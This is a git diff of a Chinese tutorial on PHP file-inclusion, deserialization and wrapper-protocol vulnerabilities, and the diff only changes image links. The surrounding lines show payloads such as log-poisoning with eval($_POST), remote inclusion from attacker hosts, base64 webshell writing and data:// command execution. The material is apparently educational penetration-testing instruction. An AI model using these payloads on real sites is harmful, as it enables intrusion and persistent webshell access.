@@ -178,7 +178,7 @@ include($test).'.php';
 http://www.test.com/test/a.php?c=1.txt%00
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviauAg5IUcibn9aNV4Md2F3bCD71jGhe2MrFG7GTNs1evKroOLeFGmccRw/640?wx_fmt=png)
+![](../../.resource/remote/546322a40ef6ac2622303ad749dfa01815534fd072f5e72a81193c5ad20da5d5.png)
 
 **注意**：%00 截断包含适合 php 版本 < 5.3.4，对应版本的配置文件 magic\_quotes\_gps=off，才能够进行绕过，否则 %00 会被转义。
 
@@ -188,7 +188,7 @@ http://www.test.com/test/a.php?c=1.txt%00
 http://www.test.com/test/a.php?c=1.txt/././././././././././././././././././....
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviabmWJ1gt5BDlFrYLEzibWctHJ8XW186ibCtZjWpRR4sbcz3qgTOHDYkQQ/640?wx_fmt=png)  
+![](../../.resource/remote/03bae6036c56593bfcb1f7eb539b0b8c42b48046f1e1e741e520ef7a493e33b8.png)  
 
 注意：Windows 服务器字节长度应大于 256，Linux 要大于 4096  
 
@@ -221,7 +221,7 @@ index.php?page=/etc/httpd/conf/httpd.conf
 http://192.168.1.3/ekucms2.4.1/?s=my/show/id/{~eval($\_POST\[x\])}
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaJbDROFlF31hnBjaMcPUhrwJHfhTJqWB6MlG44bFvacX141hbQTfCrA/640?wx_fmt=png)
+![](../../.resource/remote/fab1ca11100c1292f484bf8879a2a78e59b00e6f70004ed4079459d9f828bb14.png)
 
 ②该日志是以时间日期命名的，用菜刀连接该日志文件，得到 shell
 
@@ -229,7 +229,7 @@ http://192.168.1.3/ekucms2.4.1/?s=my/show/id/{~eval($\_POST\[x\])}
 http://192.168.1.3/ekucms2.4.1/?s=my/show/id/\\..\\temp\\logs\\20\_05\_18.log
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviamgKbpRSeFFcrlyPKA9LqZJN15z54qSh8xiaZicSibQvgVyAL7BoWDiabCw/640?wx_fmt=png)  
+![](../../.resource/remote/0063442f61998464a126afc8d6f8e812a9bb42b345591115c90f7a9a28b063b5.png)  
 
 **8\. 读源代码**
 ------------
@@ -240,7 +240,7 @@ http://192.168.1.3/ekucms2.4.1/?s=my/show/id/\\..\\temp\\logs\\20\_05\_18.log
 http://192.168.1.3/news.php?id=shell.php
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviapLcmGjHopVo1cczYxIvJ5XLrOicamln3sic7zT6K83ZfTd12dVDXhRgw/640?wx_fmt=png)  
+![](../../.resource/remote/a83a966e05171cf6fff1ab4488ff88be75ce846c95416fec5635e602491a82ed.png)  
 
 此时可以使用封装伪协议读取：
 
@@ -250,19 +250,19 @@ http://192.168.1.3/news.php?id=php://filter/read=convert.base64-encode/resource=
 //读出源代码，原理是将文件内容进行base64加密，使代码不运行解析，直接读出源代码。
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaCibKAHY94jY4lniambMibTbia7ZicaPLvqtkKNv29sRibAAva9bpiahn1WTcw/640?wx_fmt=png)  
+![](../../.resource/remote/14f66a0532c2ba299603f6407a6fe2e5c757ee1ead5e5d972729fe2441c12770.png)  
 
 **9\. 远程文件包含**
 
 远程文件包含文件名不能为 php 可解析的扩展名。另外远程文件包含要确保 php.ini 中 allow\_url\_fopen 和 allow\_url\_include 状态为 on。为躲避杀软将大马放到自己的 vps 上然后远程包含。  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaUib6I4GL7tS8pCYacpy5wTVoXibkNGfmMncM4uPfVxC0zpgF6w2WHiavg/640?wx_fmt=png)
+![](../../.resource/remote/695d802cbabb99d18bd0a383ce1527afedd353957b5a738f13ab1973c98f9749.png)
 
 ```
 http://192.168.1.3/1.php?file=http://www.xxxx.com/1.png
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcvia5JqTMYrak9nqkia86RmJABJe0hWyrN5prYAXsc8uEzicgsicib10LVV1KQ/640?wx_fmt=png)
+![](../../.resource/remote/f97a1d64e20806d89afdd4e81a6f79fa26c92d623073e96fc1fee7214dfd1b8f.png)
 
 **远程包含限制绕过后缀名限制：  
 **
@@ -276,7 +276,7 @@ include($\_GET\['filename'\] . ".html");
 
 与本地包含类似，如果源码存在后缀名限制，直接进行远程包含的话会报错如下：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviahjbjyjextu7v9yhTO5nuu3J1ptyIKloZYJkHC9gzdicDBp0OWZz6bHw/640?wx_fmt=png)
+![](../../.resource/remote/f089d247904e601b25c3ecd84e6ffef13bb06ea8871b2b016db9ae28a53abc7e.png)
 
 **绕过方法：**  
 
@@ -287,13 +287,13 @@ filename=http://www.xxxi8.com/FI/php.txt%20
 filename=http://www.xxx.com/FI/php.txt%00
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaAQiarJoyjibmrZu5iaNbfaKVP9joWznYUkjfS5ZbwNHVcAdiaIk2giasy2Q/640?wx_fmt=png)
+![](../../.resource/remote/39b1a4a77c5094ef4a7d0180945b807c672a8d7aa960628cc5874ae1ba63a895.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcvia0qtetZwiaBeticdzSJhoUFo20diaG0WY98L8j2BblnIibosqfrnHy5E6EQ/640?wx_fmt=png)
+![](../../.resource/remote/2f73f9742d052c4169cc82dd74089e6013be86d5482656d8ad443042b60261bb.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcvia8dx8JJibZQIjMib4Rf10c8fib3elnhzIaDvW858GE6jRl1ImCzjV5enyA/640?wx_fmt=png)
+![](../../.resource/remote/f78257f0e5d7219ca51cdf6f6628a21991d6eb558859b2d8593ed709254362aa.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviauic52y355keQiaJCYvNCtO0ujgbpNKFUOZ8JEZsBpAhrlRQy4T0UYJhw/640?wx_fmt=png)
+![](../../.resource/remote/300ee5e623865d72557afd0716b70856874bb0ddc7f043f5986a75bbcc0523bb.png)
 
 **利用远程文件包含进行权限维持**
 ------------------
@@ -321,7 +321,7 @@ print\_r($class1\_ser);
 
 代码执行输出结果：_O:7:“chybeta”:1:{s:4:“test”;s:3:“123”;}_
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviajGhU1YBbrjjGXL3INnRzUnhO5LPytCo4MzyauheqDVlEsZnib4OPlYw/640?wx_fmt=png)  
+![](../../.resource/remote/7c2342b9872aaa0ddfb9ed9ad352e60896a3b374c678fe6ef826be8556235ea1.png)  
 
 返回结果中各字符的含义分别为：
 
@@ -336,7 +336,7 @@ O  代表存储的是对象（object）,假如你给serialize()传入的是一�
     "123"   为字符串的内容
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaicLJmml07U1Uwt0uPWN0ljSXmWKtSm1uBWFwCnian9mAUjMrr1CaEuEw/640?wx_fmt=png)
+![](../../.resource/remote/253a3d1f8fe73d90d0e9db0f1dfade8e0dfef06dc048c44e4226ce37a8dab8df.png)
 
 **2\. 反序列化函数 unserialize()**
 
@@ -358,7 +358,7 @@ print\_r($class2\_unser);
 
 执行结果：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcvia9ict95PmSjKqEHHmVicJnnPH73vrsHKp2azsDcpmxrpsDhQGMPTbvbFQ/640?wx_fmt=png)
+![](../../.resource/remote/9bf04ea94da705e3319ad4d91c28c4e5308f37cfeff6a36b868d3ba293505b10.png)
 
 当传给 unserialize() 函数的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。  
 
@@ -412,7 +412,7 @@ $class3\_unser = unserialize($class3);
 
 3\. 通过源代码知，把对象中的 test 值赋为 “<?php phpinfo(); ?>”, 调用 unserialize() 函数，通过\_\_wakeup() 执行代码将传入的参数进行反序列化处理如下图，成功显示了 phpinfo 页面：在反序列化该数据时，自动触发了构造函数, 执行 phpinfo():
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaDOhLrunluHicyuuocO9nMy1BU18EAnfWJdmsTgK3Gyebl5rFxu5Uqmw/640?wx_fmt=png)
+![](../../.resource/remote/c825db30136808f09348015218afb06d431e0e314c5bbfa43e127634b16822d7.png)
 
 **三、漏洞梳理篇之 php 伪协议**
 
@@ -431,7 +431,7 @@ PHP 伪协议指的是 PHP 所支持的协议与封装协议，在 web 渗透漏
 **②常用伪协议条件及方法  
 **
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviatnuqm45lc6Z12UwmcLjcic368xMzicHyLlmMy8XadsEJvZmCT98JvnFQ/640?wx_fmt=png)  
+![](../../.resource/remote/f9f7ad7e3c6869beebbb613818f7057cf2f912be1f8328de5e310eae593d6917.png)  
 
 **③注意点**
 
@@ -470,7 +470,7 @@ php://input 是可以访问请求原始数据的只读流。在 POST 请求的�
 <?php system('ipconfig');?>
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcvia6LwhCwNGJS8YppnelaAZCVmjZwrvNxRtJESFh4AgCCvS4eJjmmNU4A/640?wx_fmt=png)  
+![](../../.resource/remote/9ec020c2648aa39b52d3b87d4153687ad599dc749c3569c6fed01c70ddd67307.png)  
 
 **实例二：php://input 利用文件包含写入 shell**
 
@@ -496,7 +496,7 @@ eval($data);
 
 执行成功会在当前目录下生成一句话 shell，可直接连接
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcvia2V458kKL8qCy7QKQ02YWwbdLRlWWAzIMQcMoU5thcYbe1GADSfAl4Q/640?wx_fmt=png)  
+![](../../.resource/remote/4e14db73f04bccc5536011884e620bb283893496d9581dc401f9c7be74a28788.png)  
 
 **实例三：php://input 协议直接写入 shell**
 
@@ -508,7 +508,7 @@ echo file\_put\_contents("ceshi.php",base64\_decode("PD9waHAgZXZhbCgkX1BPU1RbJ2N
 
 POST 直接传参执行 php 代码：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaO7wtHcewfZd3bJdh4LaNuiceeAe9I8jEckRDRQo53TaCSD3SaDkg6XQ/640?wx_fmt=png)
+![](../../.resource/remote/ccf545b0f076347cad0546ed68aee6c96f973393ef228975bd9bede6caaaee4e.png)
 
 同理，这里在 post 数据提交生成 shell 的代码，会在同级目录下生成 shell：
 
@@ -519,7 +519,7 @@ POST 直接传参执行 php 代码：
 127.0.0.1/1.php?file=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg==
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviasKxh40I9V3LbhFYdhpq28GRZq8Jk9ibU8zicVSZz29g2W56A8E805jbw/640?wx_fmt=png)
+![](../../.resource/remote/83f2b72129b81957a6a94a676294cdb706d8186c0bfce732ee9973ec5c9128da.png)
 
 ### **②data:URL 代码执行**  
 
@@ -529,7 +529,7 @@ POST 直接传参执行 php 代码：
 ?file=php://filter/read=convert.base64-encode/resource=1.php
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaOAL1n7IdCiaONziaZzgwnbejzWQW7VAxz7gYvcCxG4je6kqzbq4AHNYg/640?wx_fmt=png)
+![](../../.resource/remote/07ce9caa9d800c3aee80a375f2bf9ba059fe1d64be4714dad5097ee315b0792f.png)
 
 条件：allow\_url\_include = on&allow\_url\_fopen()=on& PHP>= 5.2.0
 
@@ -541,7 +541,7 @@ php://filter 用于读取网站源码。读取 php 文件源码内容 (直接包
 ?file=file:///C:\\\\phpStudy\\\\WWW\\\\fileinclude\\\\2\\\\1.txt
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaSiaCrfhVbCH2fLuWFDCiakfbPiavHcM2jicRV8SbbJzutSAtZOsibt5fz6A/640?wx_fmt=png)  
+![](../../.resource/remote/7c1aca81702122ac76c873fa6e80cd0d0b70a5e2f3cb0e7b70065a03335024fe.png)  
 
 ### **④file:// 物理路径包含文件**
 
@@ -551,7 +551,7 @@ file:// 协议在 allow\_url\_fopen,allow\_url\_include 都为 off 的情况下�
 ?file=data://text/plain,%3C?php%20system(%27whoami%27);?%3E
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviayLytiaOQWWdWIRiaANpMxoR6G0Y1IuQaUuMgJvkLediauN6bldevIU7yA/640?wx_fmt=png)
+![](../../.resource/remote/66b0abe54f1c16304e0eef1f79a69580ae48e8082bcacae206db6903c51ecb1a.png)
 
 ### **⑤data://: 利用文件包含 & data:// 进行命令执行**
 
@@ -565,7 +565,7 @@ if(isset($file) && strtolower(substr($file, -4)) == ".jpg"){
 ?>
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaVAjK4GGn42RRW1U9Ij3ct4KI7rELTZ9zNRbevsFzPW8AZm1Nrfd8Rg/640?wx_fmt=png)  
+![](../../.resource/remote/f0ea88754d58683e8e402390829dd507c42a440c79422fd6fb1c716d742695a5.png)  
 
 **⑥zip:// 绕过文件包含下的附加后缀  
 **
@@ -587,7 +587,7 @@ include($file.'.jpg');
 **绕过方法：**  
 1）实战情况下向目标站点上传 zip 文件，里面压缩着一个 jpg 格式的 php 脚本
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaNyf5jbw1yic5AoQMk50icWwJu2QE4RgcZ5qnN3jbVBgtV9oibwfg7OibHQ/640?wx_fmt=png)
+![](../../.resource/remote/c083c7a805a9810d25d37a102bc890e1ecb91b06b43caa23358c495d339c00b1.png)
 
 2）构造 zip://php.zip#php.jpg，进行 zip:// 伪协议绕过后缀名限制。这里将压缩文件里面的内容修改为在当前目录下生成一句话即可 getshell。  
 
@@ -595,9 +595,9 @@ include($file.'.jpg');
 ?file=zip://php.zip%23php.jpg
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcvia7EpT1mr66AX7kXuC5eclOXwRwnTlxdtjLTobmlpPT7icgfMGjPvnLqQ/640?wx_fmt=png)
+![](../../.resource/remote/e7b37cb0b16026c33a2746fe9f559301cb51060634f29e0d56af0b2fce2b151d.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaufQg0mZep5NxOuiadM8XnUP5Ol02mMdehIsWMaPic4v2wAE4WYIcbhUw/640?wx_fmt=jpeg)
+![](../../.resource/remote/7d9f7587ca8667c11f64c0f7062e1b2013d2f901dfaa15be245eb139fb032ba3.jpg)
 
 ---
 
